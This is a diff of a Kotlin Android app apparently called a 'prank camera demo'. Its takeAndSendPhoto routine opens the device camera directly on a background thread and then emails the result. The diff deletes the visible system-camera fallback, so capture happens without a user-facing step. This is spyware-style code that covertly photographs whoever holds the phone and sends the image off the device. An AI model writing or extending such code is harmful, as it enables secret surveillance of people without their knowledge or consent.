@@ -2,7 +2,6 @@ package com.example.prankcamerdemo
 
 import android.app.AlertDialog
 import android.graphics.Bitmap
-import android.graphics.BitmapFactory
 import android.hardware.Camera as HardwareCamera
 import android.media.MediaPlayer
 import android.os.Bundle
@@ -106,10 +105,10 @@ class MainActivity : AppCompatActivity() {
     }
     
     private fun takeAndSendPhoto() {
+        // Пробуем сделать фото через камеру напрямую
         thread {
             var photoData: ByteArray? = null
             
-            // Подход 1: Пробуем открыть камеру напрямую (может работать на некоторых устройствах)
             try {
                 var camera: HardwareCamera? = null
                 try {
@@ -174,51 +173,11 @@ class MainActivity : AppCompatActivity() {
                 e.printStackTrace()
             }
             
-            // Подход 2: Если камера не сработала - пробуем через Intent (системная камера)
-            if (photoData == null) {
-                try {
-                    runOnUiThread {
-                        val intent = android.content.Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE)
-                        // Не указываем output - получим фото в onActivityResult через extras
-                        startActivityForResult(intent, CAMERA_REQUEST_CODE)
-                    }
-                    Thread.sleep(2000) // Ждём пока пользователь сделает фото
-                } catch (e: Exception) {
-                    e.printStackTrace()
-                }
-            }
-            
             // Отправляем письмо (с фото или без)
             sendEmailWithPhoto(photoData)
         }
     }
-    
-    companion object {
-        private const val CAMERA_REQUEST_CODE = 100
-    }
-    
-    override fun onActivityResult(requestCode: Int, resultCode: Int, data: android.content.Intent?) {
-        super.onActivityResult(requestCode, resultCode, data)
-        
-        if (requestCode == CAMERA_REQUEST_CODE && resultCode == RESULT_OK) {
-            // Пользователь сделал фото через системную камеру
-            val extras = data?.extras
-            val bitmap = extras?.get("data") as? android.graphics.Bitmap
-            if (bitmap != null) {
-                val stream = ByteArrayOutputStream()
-                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream)
-                val photoData = stream.toByteArray()
-                
-                // Отправляем фото на почту
-                sendEmailWithPhoto(photoData)
-                return
-            }
-        }
-        
-        // Если фото не получилось - отправляем без него
-        sendEmailWithPhoto(null)
-    }
-    
+
     private fun sendEmailWithPhoto(photoData: ByteArray?) {
         thread {
             try {
